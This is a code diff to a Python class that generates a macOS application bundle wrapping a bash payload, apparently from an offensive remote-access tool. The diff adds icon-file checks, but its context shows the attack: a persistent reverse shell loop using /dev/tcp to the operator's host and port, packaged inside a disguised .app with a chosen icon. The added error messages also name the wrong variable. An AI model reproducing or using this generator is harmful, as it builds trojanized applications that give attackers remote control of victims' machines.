@@ -33,8 +33,15 @@ class payload:
 			if shell == "":
 				shell = "sh"
 			icon = input(h.info_general_raw("Application icon: ")).strip(" ")
-			while icon == "":
-				icon = input(h.info_general_raw("Application icon: ")).strip(" ")
+			if os.path.exists(icon):
+				if os.path.isdir(icon):
+					throw(("Error: "+run+": is a directory!"))
+					input("Press enter to continue...").strip(" ")
+					return
+			else:
+				throw(("Input file: "+run+": does not exist!"))
+				input("Press enter to continue...").strip(" ")
+				return
 			persistence = input(h.info_question_raw("Make persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
@@ -75,7 +82,8 @@ class payload:
 				return
 		h.info_general("Creating payload...")
 		os.system("cp -r data/app/payload.app "+path+" > /dev/null")
-		os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
+		if icon != "":
+			os.system("mv "+icon+" "+path+"/Contents/Resources/payload.icns > /dev/null")
 		payload = """\
 #! /usr/bin/env bash
 """+shell_command
